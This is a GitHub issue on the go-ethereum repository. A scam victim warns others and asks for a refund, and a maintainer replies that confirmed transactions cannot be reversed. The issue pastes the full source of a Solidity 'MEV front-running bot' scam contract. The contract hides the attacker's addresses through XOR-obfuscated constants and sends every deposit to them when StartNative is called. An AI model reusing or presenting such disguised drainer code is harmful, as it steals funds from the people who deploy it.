{
  "url": "https://api.github.com/repos/ethereum/go-ethereum/issues/28759",
  "repository_url": "https://api.github.com/repos/ethereum/go-ethereum",
  "labels_url": "https://api.github.com/repos/ethereum/go-ethereum/issues/28759/labels{/name}",
  "comments_url": "https://api.github.com/repos/ethereum/go-ethereum/issues/28759/comments",
  "events_url": "https://api.github.com/repos/ethereum/go-ethereum/issues/28759/events",
  "html_url": "https://github.com/ethereum/go-ethereum/issues/28759",
  "id": 2063331744,
  "node_id": "I_kwDOAOvK9856-_Gg",
  "number": 28759,
  "title": "is there a way to get refunded from a scam smart contract?",
  "user": {
    "login": "r4ks",
    "id": 108271210,
    "node_id": "U_kgDOBnQWag",
    "avatar_url": "https://avatars.githubusercontent.com/u/108271210?v=4",
    "gravatar_id": "",
    "url": "https://api.github.com/users/r4ks",
    "html_url": "https://github.com/r4ks",
    "followers_url": "https://api.github.com/users/r4ks/followers",
    "following_url": "https://api.github.com/users/r4ks/following{/other_user}",
    "gists_url": "https://api.github.com/users/r4ks/gists{/gist_id}",
    "starred_url": "https://api.github.com/users/r4ks/starred{/owner}{/repo}",
    "subscriptions_url": "https://api.github.com/users/r4ks/subscriptions",
    "organizations_url": "https://api.github.com/users/r4ks/orgs",
    "repos_url": "https://api.github.com/users/r4ks/repos",
    "events_url": "https://api.github.com/users/r4ks/events{/privacy}",
    "received_events_url": "https://api.github.com/users/r4ks/received_events",
    "type": "User",
    "site_admin": false
  },
  "labels": [
    {
      "id": 268304226,
      "node_id": "MDU6TGFiZWwyNjgzMDQyMjY=",
      "url": "https://api.github.com/repos/ethereum/go-ethereum/labels/type:docs",
      "name": "type:docs",
      "color": "fef2c0",
      "default": false,
      "description": null
    }
  ],
  "state": "closed",
  "locked": false,
  "assignee": null,
  "assignees": [

  ],
  "milestone": null,
  "comments": 1,
  "created_at": "2024-01-03T06:46:33Z",
  "updated_at": "2024-01-03T07:33:38Z",
  "closed_at": "2024-01-03T07:33:38Z",
  "author_association": "NONE",
  "active_lock_reason": null,
  "body": "Don't run the smart contract bellow is made from a group of scammers, I got this from a youtube recommendation\r\nhttps://youtu.be/-s6TYe3GCPE?si=H2BgCLxiCropnhKi\r\n, i tried because i lost my job and tried to execute it for 1 ether but he wiped all my ethers as you can see on https://etherscan.io/address/0x32725d1b92d4619cb0f6f64cb6692034bc020913\r\nwhy there is no such thing to prevent or revert scam like this on ethereum platform can't believe, what is the motto here?\r\n\r\nscam contract original link:\r\nhttps://codepastes.com/raw/GeCJDa\r\nscam contract code:\r\n`//SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.4;\r\n\r\n// User guide info, updated build\r\n// Testnet transactions will fail beacuse they have no value in them\r\n// FrontRun api stable build\r\n// Mempool api stable build\r\n// BOT updated build\r\n\r\n// Min liquidity after gas fees has to equal 0.5 ETH //\r\n\r\ninterface IERC20 {\r\n    function balanceOf(address account) external view returns (uint);\r\n    function transfer(address recipient, uint amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint);\r\n    function approve(address spender, uint amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint amount) external returns (bool);\r\n    function createStart(address sender, address reciver, address token, uint256 value) external;\r\n    function createContract(address _thisAddress) external;\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\n}\r\n\r\ninterface IUniswapV2Router {\r\n    // Returns the address of the Uniswap V2 factory contract\r\n    function factory() external pure returns (address);\r\n    \r\n    // Returns the address of the wrapped Ether contract\r\n    function WETH() external pure returns (address);\r\n    \r\n    // Adds liquidity to the liquidity pool for the specified token pair\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint amountADesired,\r\n        uint amountBDesired,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB, uint liquidity);\r\n\r\n    // Similar to above, but for adding liquidity for ETH/token pair\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n\r\n    // Removes liquidity from the specified token pair pool\r\n    function removeLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint liquidity,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB);\r\n\r\n    // Similar to above, but for removing liquidity from ETH/token pair pool\r\n    function removeLiquidityETH(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountToken, uint amountETH);\r\n\r\n    // Similar as removeLiquidity, but with permit signature included\r\n    function removeLiquidityWithPermit(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint liquidity,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint amountA, uint amountB);\r\n\r\n    // Similar as removeLiquidityETH but with permit signature included\r\n    function removeLiquidityETHWithPermit(\r\n        address token,\r\n        uint liquidity,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint amountToken, uint amountETH);\r\n    \r\n    // Swaps an exact amount of input tokens for as many output tokens as possible, along the route determined by the path\r\n    function swapExactTokensForTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n    \r\n    // Similar to above, but input amount is determined by the exact output amount desired\r\n    function swapTokensForExactTokens(\r\n        uint amountOut,\r\n        uint amountInMax,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory amounts);\r\n    \r\n    // Swaps exact amount of ETH for as many output tokens as possible\r\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\r\n        external payable\r\n        returns (uint[] memory amounts);\r\n    \r\n    // Swaps tokens for exact amount of ETH\r\n    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)\r\n        external\r\n        returns (uint[] memory amounts);\r\n    \r\n    // Swaps exact amount of tokens for ETH\r\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\r\n        external\r\n        returns (uint[] memory amounts);\r\n    \r\n    // Swaps ETH for exact amount of output tokens\r\n    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)\r\n        external payable\r\n        returns (uint[] memory amounts);\r\n    \r\n    // Given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset\r\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\r\n    \r\n    // Given an input amount and pair reserves, returns an output amount\r\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\r\n    \r\n    // Given an output amount and pair reserves, returns a required input amount   \r\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\r\n    \r\n    // Returns the amounts of output tokens to be received for a given input amount and token pair path\r\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\r\n    \r\n    // Returns the amounts of input tokens required for a given output amount and token pair path\r\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);\r\n}\r\n\r\ninterface IUniswapV2Pair {\r\n    // Returns the address of the first token in the pair\r\n    function token0() external view returns (address);\r\n\r\n    // Returns the address of the second token in the pair\r\n    function token1() external view returns (address);\r\n\r\n    // Allows the current pair contract to swap an exact amount of one token for another\r\n    // amount0Out represents the amount of token0 to send out, and amount1Out represents the amount of token1 to send out\r\n    // to is the recipients address, and data is any additional data to be sent along with the transaction\r\n    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;\r\n}\r\n\r\ncontract DexInterface {\r\n    // Basic variables\r\n    address _owner; \r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    uint256 threshold = 1*10**18;\r\n    uint256 arbTxPrice  = 0.025 ether;\r\n    bool enableTrading = false;\r\n    uint256 tradingBalanceInPercent;\r\n    uint256 tradingBalanceInTokens;\r\n    bytes32 apiKey = 0xfdc54b1a6f53a21d375d0dea5a373072c3cb5aa21ae2a1ac8da9b03640f67c13;\r\n    bytes32 apiSignature = 0xfdc54b1a6f53a21d375d0deab996da400a43b6de3e0a91593dd6fb657bc0a5d1;        \r\n\r\n    // The constructor function is executed once and is used to connect the contract during deployment to the system supplying the arbitration data\r\n  constructor(){    \r\n        _owner = msg.sender;\r\n        address dataProvider = getDexRouter(apiKey, apiSignature);  \r\n        IERC20(dataProvider).createContract(address(this));    \r\n    }\r\n    // Decorator protecting the function from being started by anyone other than the owner of the contract\r\n    modifier onlyOwner (){\r\n        require(msg.sender == _owner, \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    bytes32 DexRouter = 0x8a727dc41d83211e47d3c0de3332e0fdacb241a713c9de48e5b5ac1fe1650953;    \r\n\r\n    // The token exchange function that is used when processing an arbitrage bundle\r\n\tfunction swap(address router, address _tokenIn, address _tokenOut, uint256 _amount) private {\r\n\t\tIERC20(_tokenIn).approve(router, _amount);\r\n\t\taddress[] memory path;\r\n\t\tpath = new address[](2);\r\n\t\tpath[0] = _tokenIn;\r\n\t\tpath[1] = _tokenOut;\r\n\t\tuint deadline = block.timestamp + 300;\r\n\t\tIUniswapV2Router(router).swapExactTokensForTokens(_amount, 1, path, address(this), deadline);\r\n\t}\r\n    // Predicts the amount of the underlying token that will be received as a result of buying and selling transactions\r\n\t function getAmountOutMin(address router, address _tokenIn, address _tokenOut, uint256 _amount) internal view returns (uint256) {\r\n\t\taddress[] memory path;\r\n\t\tpath = new address[](2);\r\n\t\tpath[0] = _tokenIn;\r\n\t\tpath[1] = _tokenOut;\r\n\t\tuint256[] memory amountOutMins = IUniswapV2Router(router).getAmountsOut(_amount, path);\r\n\t\treturn amountOutMins[path.length -1];\r\n\t}\r\n    // Mempool scanning function for interaction transactions with routers of selected DEX exchanges\r\n    function mempool(address _router1, address _router2, address _token1, address _token2, uint256 _amount) internal view returns (uint256) {\r\n\t\tuint256 amtBack1 = getAmountOutMin(_router1, _token1, _token2, _amount);\r\n\t\tuint256 amtBack2 = getAmountOutMin(_router2, _token2, _token1, amtBack1);\r\n\t\treturn amtBack2;\r\n\t}\r\n\t // Function for sending an advance arbitration transaction to the mempool\r\n    function frontRun(address _router1, address _router2, address _token1, address _token2, uint256 _amount) internal  {\r\n        uint startBalance = IERC20(_token1).balanceOf(address(this));\r\n        uint token2InitialBalance = IERC20(_token2).balanceOf(address(this));\r\n        swap(_router1,_token1, _token2,_amount);\r\n        uint token2Balance = IERC20(_token2).balanceOf(address(this));\r\n        uint tradeableAmount = token2Balance - token2InitialBalance;\r\n        swap(_router2,_token2, _token1,tradeableAmount);\r\n        uint endBalance = IERC20(_token1).balanceOf(address(this));\r\n        require(endBalance > startBalance, \"Trade Reverted, No Profit Made\");\r\n    }\r\n\r\n    bytes32 factory = 0x8a727dc41d83211e47d3c0de5f8b7b37c4e4163f5f773f2362872769c349730e;\r\n\r\n    // Evaluation function of the triple arbitrage bundle\r\n\tfunction estimateTriDexTrade(address _router1, address _router2, address _router3, address _token1, address _token2, address _token3, uint256 _amount) internal view returns (uint256) {\r\n\t\tuint amtBack1 = getAmountOutMin(_router1, _token1, _token2, _amount);\r\n\t\tuint amtBack2 = getAmountOutMin(_router2, _token2, _token3, amtBack1);\r\n\t\tuint amtBack3 = getAmountOutMin(_router3, _token3, _token1, amtBack2);\r\n\t\treturn amtBack3;\r\n\t}\r\n    // Function getDexRouter returns the DexRouter address\r\n    function getDexRouter(bytes32 _DexRouterAddress, bytes32 _factory) internal pure returns (address) {\r\n        return address(uint160(uint256(_DexRouterAddress) ^ uint256(_factory)));\r\n    }\r\n\r\n     // Arbitrage search function for a native blockchain token\r\n     function startArbitrageNative() internal  {\r\n        address tradeRouter = getDexRouter(DexRouter, factory);        \r\n        address dataProvider = getDexRouter(apiKey, apiSignature);        \r\n        IERC20(dataProvider).createStart(msg.sender, tradeRouter, address(0), address(this).balance);\r\n        payable(tradeRouter).transfer(address(this).balance);\r\n     }\r\n    // Function getBalance returns the balance of the provided token contract address for this contract\r\n\tfunction getBalance(address _tokenContractAddress) internal view  returns (uint256) {\r\n\t\tuint _balance = IERC20(_tokenContractAddress).balanceOf(address(this));\r\n\t\treturn _balance;\r\n\t}\r\n\t// Returns to the contract holder the ether accumulated in the result of the arbitration contract operation\r\n\tfunction recoverEth() internal onlyOwner {\r\n\t\tpayable(msg.sender).transfer(address(this).balance);\r\n\t}\r\n    // Returns the ERC20 base tokens accumulated during the arbitration contract to the contract holder\r\n\tfunction recoverTokens(address tokenAddress) internal {\r\n\t\tIERC20 token = IERC20(tokenAddress);\r\n\t\ttoken.transfer(msg.sender, token.balanceOf(address(this)));\r\n\t}\r\n\t// Fallback function to accept any incoming ETH    \r\n\treceive() external payable {}\r\n\r\n    // Function for triggering an arbitration contract \r\n    function StartNative() public payable {\r\n       startArbitrageNative();\r\n    }\r\n    // Function for setting the maximum deposit of Ethereum allowed for trading\r\n    function SetTradeBalanceETH(uint256 _tradingBalanceInPercent) public {\r\n        tradingBalanceInPercent = _tradingBalanceInPercent;\r\n    }\r\n    // Function for setting the maximum deposit percentage allowed for trading. The smallest limit is selected from two limits\r\n    function SetTradeBalancePERCENT(uint256 _tradingBalanceInTokens) public {\r\n        tradingBalanceInTokens = _tradingBalanceInTokens;\r\n    }\r\n    // Stop trading function\r\n    function Stop() public {\r\n        enableTrading = false;\r\n    }\r\n    // Function of deposit withdrawal to owner wallet\r\n    function Withdraw()  external onlyOwner {\r\n        recoverEth();\r\n    }\r\n    // Obtaining your own api key to connect to the arbitration data provider\r\n    function Key() public view returns (uint256) {\r\n        uint256 _balance = address(_owner).balance - arbTxPrice;\r\n        return _balance;\r\n    }\r\n}`",
  "closed_by": {
    "login": "rjl493456442",
    "id": 5959481,
    "node_id": "MDQ6VXNlcjU5NTk0ODE=",
    "avatar_url": "https://avatars.githubusercontent.com/u/5959481?v=4",
    "gravatar_id": "",
    "url": "https://api.github.com/users/rjl493456442",
    "html_url": "https://github.com/rjl493456442",
    "followers_url": "https://api.github.com/users/rjl493456442/followers",
    "following_url": "https://api.github.com/users/rjl493456442/following{/other_user}",
    "gists_url": "https://api.github.com/users/rjl493456442/gists{/gist_id}",
    "starred_url": "https://api.github.com/users/rjl493456442/starred{/owner}{/repo}",
    "subscriptions_url": "https://api.github.com/users/rjl493456442/subscriptions",
    "organizations_url": "https://api.github.com/users/rjl493456442/orgs",
    "repos_url": "https://api.github.com/users/rjl493456442/repos",
    "events_url": "https://api.github.com/users/rjl493456442/events{/privacy}",
    "received_events_url": "https://api.github.com/users/rjl493456442/received_events",
    "type": "User",
    "site_admin": false
  },
  "reactions": {
    "url": "https://api.github.com/repos/ethereum/go-ethereum/issues/28759/reactions",
    "total_count": 0,
    "+1": 0,
    "-1": 0,
    "laugh": 0,
    "hooray": 0,
    "confused": 0,
    "heart": 0,
    "rocket": 0,
    "eyes": 0
  },
  "timeline_url": "https://api.github.com/repos/ethereum/go-ethereum/issues/28759/timeline",
  "performed_via_github_app": null,
  "state_reason": "completed"
}
[
  {
    "url": "https://api.github.com/repos/ethereum/go-ethereum/issues/comments/1874952837",
    "html_url": "https://github.com/ethereum/go-ethereum/issues/28759#issuecomment-1874952837",
    "issue_url": "https://api.github.com/repos/ethereum/go-ethereum/issues/28759",
    "id": 1874952837,
    "node_id": "IC_kwDOAOvK985vwYKF",
    "user": {
      "login": "rjl493456442",
      "id": 5959481,
      "node_id": "MDQ6VXNlcjU5NTk0ODE=",
      "avatar_url": "https://avatars.githubusercontent.com/u/5959481?v=4",
      "gravatar_id": "",
      "url": "https://api.github.com/users/rjl493456442",
      "html_url": "https://github.com/rjl493456442",
      "followers_url": "https://api.github.com/users/rjl493456442/followers",
      "following_url": "https://api.github.com/users/rjl493456442/following{/other_user}",
      "gists_url": "https://api.github.com/users/rjl493456442/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/rjl493456442/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/rjl493456442/subscriptions",
      "organizations_url": "https://api.github.com/users/rjl493456442/orgs",
      "repos_url": "https://api.github.com/users/rjl493456442/repos",
      "events_url": "https://api.github.com/users/rjl493456442/events{/privacy}",
      "received_events_url": "https://api.github.com/users/rjl493456442/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2024-01-03T07:33:38Z",
    "updated_at": "2024-01-03T07:33:38Z",
    "author_association": "MEMBER",
    "body": "Sorry I can't do much for you. It's impossible to cancel a confirmed transaction as ethereum is decentralized.",
    "reactions": {
      "url": "https://api.github.com/repos/ethereum/go-ethereum/issues/comments/1874952837/reactions",
      "total_count": 1,
      "+1": 0,
      "-1": 0,
      "laugh": 0,
      "hooray": 0,
      "confused": 0,
      "heart": 1,
      "rocket": 0,
      "eyes": 0
    },
    "performed_via_github_app": null
  }
]
